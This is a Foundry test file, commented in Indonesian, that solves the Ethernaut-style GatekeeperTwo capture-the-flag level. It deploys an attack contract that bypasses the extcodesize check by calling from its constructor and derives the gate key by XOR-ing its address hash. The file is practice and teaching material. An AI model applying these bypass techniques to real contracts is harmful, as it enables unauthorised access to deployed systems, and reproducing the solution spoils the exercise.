// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {GatekeeperTwo} from "src/levels/GatekeeperTwo.sol";
import {GatekeeperTwoFactory} from "src/levels/GatekeeperTwoFactory.sol";

contract GatekeeperTwoAttack {
    constructor(address gatekeeper) {
        // gateTwo: extcodesize(caller()) == 0 — hanya benar SELAMA
        // konstruksi (kontrak belum punya kode). Jadi serang dari
        // constructor. gateThree: key = keccak256(msg.sender) ^ type(uint64).max.
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        );
        GatekeeperTwo(gatekeeper).enter(key);
    }
}

contract GatekeeperTwoSolve is Test {
    GatekeeperTwoFactory factory;
    GatekeeperTwo instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new GatekeeperTwoFactory();
        instance = GatekeeperTwo(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // prank 2 argumen: msg.sender DAN tx.origin = player (entrant =
        // tx.origin; prank 1 argumen hanya mengubah msg.sender, sehingga
        // entrant jatuh ke DefaultSender).
        vm.startPrank(player, player);
        new GatekeeperTwoAttack(address(instance));
        vm.stopPrank();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
